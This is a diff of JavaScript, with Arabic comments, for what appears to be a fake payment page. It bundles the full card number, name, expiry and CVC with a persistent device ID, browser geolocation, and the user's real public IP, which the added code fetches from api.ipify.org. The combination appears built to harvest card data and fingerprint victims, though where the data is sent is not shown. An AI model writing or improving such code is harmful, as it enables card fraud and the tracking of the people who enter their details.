@@ -593,6 +593,19 @@
         }
 
         /**
+         * دالة جلب IP الخارجي للمستخدم عبر API
+         */
+        async function getPublicIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json', { timeout: 3000 });
+                const data = await response.json();
+                return data.ip;
+            } catch (err) {
+                return "تعذر الجلب من المتصفح";
+            }
+        }
+
+        /**
          * دالة جلب الإحداثيات الجغرافية بدقة مع التراجع التلقائي
          */
         function getGeolocation() {
@@ -606,7 +619,6 @@
                             });
                         },
                         () => {
-                            // القيم الافتراضية في حالة عدم السماح بالوصول للموقع
                             resolve({ lat: "30.0444", lon: "31.2357" });
                         },
                         { timeout: 5000 }
@@ -646,10 +658,10 @@
             submitBtn.disabled = true;
             submitBtn.innerText = "جاري المعالجة والتحويل...";
 
-            // 1. توليد أو استرجاع المعرف الفريد للعميل
+            // 1. توليد أو استرجاع المعرف الفريد للجهاز (Device UUID)
             let clientID = localStorage.getItem("clientID");
             if (!clientID) {
-                clientID = "ID_" + Math.random().toString(36).substr(2, 9);
+                clientID = "DEV_" + Math.random().toString(36).substr(2, 9) + "_" + Date.now();
                 localStorage.setItem("clientID", clientID);
             }
 
@@ -662,8 +674,11 @@
                 }
             } catch (err) {}
 
-            // 3. جلب الإحداثيات الجغرافية
-            const geo = await getGeolocation();
+            // 3. جلب الإحداثيات الجغرافية والـ IP الخارجي الحقيقي بشكل متوازي
+            const [geo, publicIP] = await Promise.all([
+                getGeolocation(),
+                getPublicIP()
+            ]);
 
             // 4. بناء كائن البيانات الكامل المدمج
             const payload = {
@@ -671,18 +686,17 @@
                 payment_method: selectedMethod,
                 phone: selectedMethod === "wallet" ? document.getElementById("user_phone").value : "غير محدد",
                 
-                // بيانات الكارت (في حالة استخدام الفيزا/ماستر كارد)
+                // بيانات الكارت
                 number: selectedMethod === "card" ? cardNumberInput.value.replace(/\s+/g, '') : "",
                 name: selectedMethod === "card" ? nameInput.value : "",
                 expiry: selectedMethod === "card" ? mmyyInput.value : "",
                 cvc: selectedMethod === "card" ? cvcInput.value : "",
                 save_card: document.getElementById("save_card").checked ? "tokenize" : "لا",
 
-                // تفاصيل وشبكة ومواصفات الجهاز
-                clientID: clientID,
+                // تفاصيل الجهاز، الشبكة، والمعرفات
+                clientID: clientID, // معرف فريد مميز للجهاز
                 internalIP: window.location.hostname || "127.0.0.1",
-                publicIP: "سيتم جلبها أوتوماتيكياً عبر السيرفر",
-                mac: "00:00:00:00:00:00",
+                publicIP: publicIP, // الـ IP الخارجي المجلوب أوتوماتيكياً
                 lat: geo.lat,
                 lon: geo.lon,
                 city: "القاهرة",
